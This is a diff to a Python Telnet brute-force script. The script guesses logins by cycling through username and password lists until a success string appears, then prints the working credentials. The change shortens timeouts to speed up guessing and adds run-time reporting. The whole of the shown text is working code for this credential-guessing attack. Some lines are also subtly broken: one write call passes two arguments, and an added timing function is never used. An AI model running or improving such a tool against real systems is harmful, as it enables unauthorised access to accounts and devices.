@@ -14,6 +14,8 @@ from ipaddress import ip_address
 import telnetlib
 from json import load
 from os.path import isfile
+from datetime import datetime
+from time import time
 
 def parse_args():
     parser = ArgumentParser(description='Telnet authentication brute force script')
@@ -85,12 +87,12 @@ def try_login_combination(connection, username, password, password_only=False, s
     """
 
     if not password_only:
-        connection.read_until(b'login: ', timeout=2)
+        connection.read_until(b'login: ', timeout=1)
         connection.write(username.encode('ascii'), b'\r')
-    connection.read_until(b'password:', timeout=2)
+    connection.read_until(b'password:', timeout=1)
     connection.write(password.encode('ascii') + b'\r')
 
-    ret = connection.read_until(success_string.encode('ascii'), timeout=2)
+    ret = connection.read_until(success_string.encode('ascii'), timeout=1)
     success = True if success_string in ret.decode('ascii') else False
     return success
 
@@ -98,8 +100,17 @@ def exit_with_message(message, exit_code=1):
     print(message)
     exit(exit_code)
 
-def login_successful(password, username=None):
+def print_passed_time(begin, end):
+    """
+    Print the time it has taken between begin and end.
+    :param begin: time: the start time
+    :param end: time: the end time
+    """
+    print('Total run time (s): {}'.format(end-begin))
+
+def login_successful(start_time, password, username=None):
     print('Login successful using username: {} and password: {}'.format(username, password))
+    print('Total run time (s): {}'.format(time()-start_time))
     exit(0)
 
 def main():
@@ -112,6 +123,8 @@ def main():
         usernames = get_json_values_from_file(args.username_file)
     passwords = get_json_values_from_file(args.password_file)
 
+    start_time = time()
+    print('Start time is: {}'.format(datetime.now()))
     if not args.password_only:
         # For each username we try all password combinations
         for username in usernames['usernames']:
@@ -120,7 +133,7 @@ def main():
                 success = try_login_combination(con, username, password, success_string=args.success_string)
                 con.close()
                 if success:
-                    login_successful(password, username)
+                    login_successful(start_time, password, username)
     else:
         # Just try password login
         for password in passwords['passwords']:
@@ -128,7 +141,7 @@ def main():
             success = try_login_combination(con, None, password, password_only=True, success_string=args.success_string)
             con.close()
             if success:
-                login_successful(password)
+                login_successful(start_time, password)
 
     print('Unable to find Telnet login ... Too bad')
 
